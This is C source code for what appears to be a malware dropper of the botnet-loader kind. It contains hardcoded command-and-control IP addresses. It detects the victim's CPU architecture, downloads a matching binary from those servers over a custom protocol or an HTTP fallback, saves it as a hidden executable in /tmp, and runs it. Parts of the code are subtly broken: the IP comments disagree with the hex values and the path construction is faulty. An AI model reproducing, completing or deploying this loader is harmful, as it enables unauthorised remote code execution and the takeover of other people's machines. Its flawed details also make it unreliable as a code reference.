#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <netdb.h>

struct cnc_addr {
    unsigned int ip;
    unsigned short port;
};

static struct cnc_addr cnc_list[] = {
    {0xC09D0D34, 34132},  // 198.157.13.52
    {0xC09D0D37, 34132},  // 198.157.13.55
    {0xC09D0D33, 34132},  // 198.157.13.51
};
#define CNC_COUNT (sizeof(cnc_list) / sizeof(cnc_list[0]))

static void str_copy(char *dst, const char *src)
{
    while (*src) *dst++ = *src++;
    *dst = '\0';
}

static int str_len(const char *s)
{
    int i = 0;
    while (s[i]) i++;
    return i;
}

static int write_all(int fd, const void *buf, int len)
{
    const char *p = buf;
    int sent = 0;
    while (sent < len) {
        int n = write(fd, p + sent, len - sent);
        if (n <= 0) return -1;
        sent += n;
    }
    return sent;
}

static int read_all(int fd, void *buf, int len)
{
    char *p = buf;
    int got = 0;
    while (got < len) {
        int n = read(fd, p + got, len - got);
        if (n <= 0) break;
        got += n;
    }
    return got;
}

static void detect_arch(char *out, int outsz)
{
    struct utsname u;
    if (uname(&u) == 0) {
        str_copy(out, u.machine);
        return;
    }
    str_copy(out, "x86_64");
}

static int is_little_endian(void)
{
    unsigned int x = 1;
    return *(char *)&x;
}

static uint32_t net_to_host_32(uint32_t x)
{
    if (is_little_endian())
        return ((x & 0xFF) << 24) | ((x & 0xFF00) << 8) |
               ((x >> 8) & 0xFF00) | ((x >> 24) & 0xFF);
    return x;
}

static uint16_t net_to_host_16(uint16_t x)
{
    if (is_little_endian())
        return ((x & 0xFF) << 8) | ((x >> 8) & 0xFF);
    return x;
}

static uint16_t host_to_net_16(uint16_t x)
{
    return net_to_host_16(x);
}

static uint32_t host_to_net_32(uint32_t x)
{
    return net_to_host_32(x);
}

int main(int argc, char **argv)
{
    char arch[64];
    char path[256];
    char url[512];
    int fd, n;

    detect_arch(arch, sizeof(arch));

    // build download path
    str_copy(path, "/tmp/.x");
    {
        // generate random suffix
        unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)getpid();
        char suffix[9] = {0};
        int i;
        for (i = 0; i < 8; i++) {
            seed = seed * 1103515245 + 12345;
            suffix[i] = 'a' + ((seed >> 16) & 0x1F);
        }
        str_copy(path, "/tmp/.");
        str_copy(path + 2, suffix);
    }

    // try each CNC in list
    for (int cnc = 0; cnc < (int)CNC_COUNT; cnc++) {
        struct sockaddr_in addr;
        uint32_t total_size;
        uint16_t arch_len;
        char arch_buf[128];
        int ok = 0;

        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = cnc_list[cnc].ip;
        addr.sin_port = host_to_net_16(cnc_list[cnc].port);

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(fd);
            continue;
        }

        // send arch request: [arch_len:2][arch]
        arch_len = (uint16_t)str_len(arch);
        {
            uint16_t alen_net = host_to_net_16(arch_len);
            write_all(fd, &alen_net, 2);
            write_all(fd, arch, arch_len);
        }

        // read response header: [total_size:4][offset:4][data_len:2][data...]
        n = read_all(fd, &total_size, 4);
        if (n != 4) { close(fd); continue; }
        total_size = net_to_host_32(total_size);

        if (total_size == 0 || total_size > 20 * 1024 * 1024) {
            close(fd);
            continue;
        }

        // write binary to temp file
        int outfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (outfd < 0) { close(fd); continue; }

        uint32_t received = 0;
        while (received < total_size) {
            // skip offset:4
            uint8_t hdr[10];
            n = read_all(fd, hdr, 10);
            if (n != 10) break;

            uint16_t chunk_len = net_to_host_16(*(uint16_t *)(hdr + 8));
            if (chunk_len == 0 || chunk_len > 65535) break;

            char chunk[65536];
            n = read_all(fd, chunk, chunk_len);
            if (n != chunk_len) break;

            write_all(outfd, chunk, chunk_len);
            received += chunk_len;
        }

        close(outfd);
        close(fd);

        if (received >= total_size) {
            ok = 1;
            break;
        }
    }

    // try to connect via HTTP if bin server protocol failed
    if (access(path, R_OK) != 0) {
        // fallback: try HTTP on port 80
        for (int cnc = 0; cnc < (int)CNC_COUNT; cnc++) {
            struct sockaddr_in addr;
            char resp[4096];

            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;

            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = cnc_list[cnc].ip;
            addr.sin_port = host_to_net_16(80);

            if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                close(fd);
                continue;
            }

            // send HTTP GET /<arch>
            str_copy(url, "GET /");
            str_copy(url + 5, arch);
            str_copy(url + 5 + str_len(arch), " HTTP/1.0\r\nHost: x\r\n\r\n");
            write_all(fd, url, str_len(url));

            // read until \r\n\r\n (headers)
            int total = 0;
            int found = 0;
            while (total < sizeof(resp) - 1) {
                n = read(fd, resp + total, 1);
                if (n <= 0) break;
                total += n;
                if (total >= 4 &&
                    resp[total-4] == '\r' && resp[total-3] == '\n' &&
                    resp[total-2] == '\r' && resp[total-1] == '\n') {
                    found = 1;
                    break;
                }
            }

            if (!found) { close(fd); continue; }

            // body starts at total (after headers)
            int body_start = total;
            int outfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (outfd < 0) { close(fd); continue; }

            // write any data already read in header buffer
            if (body_start < total)
                write_all(outfd, resp + body_start, total - body_start);

            while (1) {
                n = read(fd, resp, sizeof(resp));
                if (n <= 0) break;
                write_all(outfd, resp, n);
            }

            close(outfd);
            close(fd);

            if (access(path, R_OK) == 0) break;
        }
    }

    // execute downloaded binary
    if (access(path, X_OK) == 0) {
        char *new_argv[] = {path, NULL};
        execve(path, new_argv, NULL);
    }

    // self-delete
    unlink(path);
    return 0;
}
